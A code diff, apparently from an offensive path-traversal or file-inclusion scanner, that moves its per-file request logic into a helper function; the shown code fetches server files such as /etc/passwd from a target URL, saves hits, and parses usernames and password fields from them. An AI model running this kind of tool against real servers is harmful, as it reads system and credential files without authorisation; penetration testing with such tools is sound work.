@@ -277,7 +277,10 @@ def main():
     print("[*] Done!\n")
     print("[*] Searching for files...")
 
-    for case in cases:
+    def request_file(case, found):
+        """
+        Request file from URL
+        """
         if args.replace_slash:
             case["location"] = case["location"].replace("/", args.replace_slash.replace("\\", "\\\\"))
 
@@ -285,7 +288,7 @@ def main():
             if args.verbose:
                 print("[o] Skipping '%s'" % case["location"])
 
-            continue
+            return None, found
 
         if args.prefix and args.prefix[len(args.prefix) - 1] == "/":
             args.prefix = args.prefix[:-1]
@@ -297,7 +300,7 @@ def main():
         html, _ = get_page(**request_args)
 
         if not html:
-            continue
+            return None, found
 
         matcher = difflib.SequenceMatcher(None, clean_response(html, case["location"]), clean_response(invalid_response, INVALID_FILENAME))
 
@@ -323,11 +326,20 @@ def main():
                 with open(os.path.join(_, "%s.txt" % case["location"].replace("/", "_")), "w") as f:
                     f.write(html)
 
-            # If --skip-file-parsing is not set.
-            if case["location"] in ("/etc/passwd", "/etc/security/passwd") and not args.skip_parsing:
-                users = re.findall("(?P<username>[^:\n]+):(?P<password>[^:]*):(?P<uid>\d+):(?P<gid>\d*):(?P<info>[^:]*):(?P<home>[^:]+):[/a-z]*", html)
-                for user in users:
-                    username, password, uid, gid, info, home = user
+        return html, found
+
+    # Test file locations in XML file
+    for case in cases:
+        html, found = request_file(case, found)
+
+        if not html:
+            continue
+
+        # If --skip-file-parsing is not set.
+        if case["location"] in ("/etc/passwd", "/etc/security/passwd") and not args.skip_parsing:
+            users = re.findall("(?P<username>[^:\n]+):(?P<password>[^:]*):(?P<uid>\d+):(?P<gid>\d*):(?P<info>[^:]*):(?P<home>[^:]+):[/a-z]*", html)
+            for user in users:
+                username, password, uid, gid, info, home = user
 
     if not found:
         print("[*] No files found!")
